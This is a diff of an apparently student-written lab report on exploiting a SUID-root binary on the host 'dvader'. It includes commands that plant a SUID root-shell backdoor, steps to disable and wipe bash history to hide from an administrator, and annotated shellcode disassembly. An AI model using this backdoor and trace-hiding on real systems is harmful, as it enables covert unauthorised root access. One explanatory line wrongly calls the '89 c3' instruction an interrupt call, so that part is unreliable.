@@ -54,7 +54,7 @@ To gain persistance, we wrote a program to open bash that we compiled on dvader.
 chown root program
 chmod 4755 program
 ```
-This changes the program's owner to root and sets the SUID bit. Basically anyone who runs the program runs it with the priviledges of 
+This changes the program's owner to root and sets the SUID bit. Basically anyone who runs the program runs it with the privileges of 
 the owner, in this case root. Which results in a root shell. Apparently bash ignores effective user ID when it's started with `execve`, that's why we use `setreuid(0,0)` which sets both effective and real UID to root.
 
 To hide the persistant access from an admin, `setenv()` is used to make bash not storing the command history. The only manual thing that has to be done is removing the traces of `chown` and `chmod` from root's `.bash_history`. Which can be done from the "no history" shell once it's setup.
@@ -79,23 +79,27 @@ int main(int argc, char *argv[]) {
 A comment about hints and resources. We primarily used the `.bash_history` file on dvader and the provided video material as inspiration for out exploit. Extensive googling and a hex calculator was also used.
 
 ### Instructions
-As mentioned previously, the main vulnerability is that the special user id bit is set for the binary and that root is owner. This means that the program is run with root priviledges, and any process that spawns from it can have the same level of priviledges. One important point that the shellcode comments make are the lack of NULL bytes, this is because it's a string terminator on unix and if it is included in the argument, it terminates it. Therefore not including the rest of the exploit. That's why instead of writing a zero (\00) to a register (to set the UID bit to 0) the register is xor'd with itself ("\x31\xc0"). To make it slightly easier to read, we built a binary of the hex representation of shellcode and deassemblied it.
+As mentioned previously, the main vulnerability is that the special user id bit is set for the binary and that root is owner. This means that the program is run with root privileges, and any process that spawns from it can have the same level of privileges. One important point that the shellcode comments make are the lack of NULL bytes, this is because it's a string terminator on unix and if it is included as the argument, it terminates the command string. Therefore they are actively avoided in the exploit. That's why instead of writing a zero (\00) to a register (to set the UID bit to 0) the register is xor'd with itself (`31 c0`). To make it slightly easier to read, we built a binary of the hex representation of shellcode and deassemblied it.
+
+`89 c3`, is a call to the operating system's interrupt handler, 80 is the code for system call. Which system call is determined by the `eax` register, which on line is 31, geteuid. The zero byte bypass makes sense here since it's used to place 00..0031 (32-bit) into `eax`, but 00 would render the exploit useless. Instead `eax` is first cleared with self xoring and then 31 is put in the least significant byte with `%al`. The return value of the system call is put in `eax` and is copied over to `ebx` because that's the register used for single arguments to system calls. The next system call is 46 `setreuid`, which set's the uid to 0. The same process is repeated for group id. Especially the highlighted instruction puts 47 in the least significant byte of `eax` to act as argument to the system call interrupt, it's the code for setregid.
+
+
 
 ```
    0:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
-   5:	31 c0                	xor    %eax,%eax
+   5:	31 c0                	xor    %eax,%eax        <-- Highlighted
    7:	b0 31                	mov    $0x31,%al
    9:	cd 80                	int    $0x80
-   b:	89 c3                	mov    %eax,%ebx
+   b:	89 c3                	mov    %eax,%ebx        <-- Highlighted
    d:	31 c0                	xor    %eax,%eax
    f:	b0 46                	mov    $0x46,%al
   11:	cd 80                	int    $0x80
   13:	31 c0                	xor    %eax,%eax
   15:	b0 32                	mov    $0x32,%al
   17:	cd 80                	int    $0x80
-  19:	89 c3                	mov    %eax,%ebx
+  19:	89 c3                	mov    %eax,%ebx        
   1b:	b0 31                	mov    $0x31,%al
-  1d:	b0 47                	mov    $0x47,%al
+  1d:	b0 47                	mov    $0x47,%al        <-- Highlighted
   1f:	cd 80                	int    $0x80
   21:	31 c0                	xor    %eax,%eax
   23:	31 d2                	xor    %edx,%edx
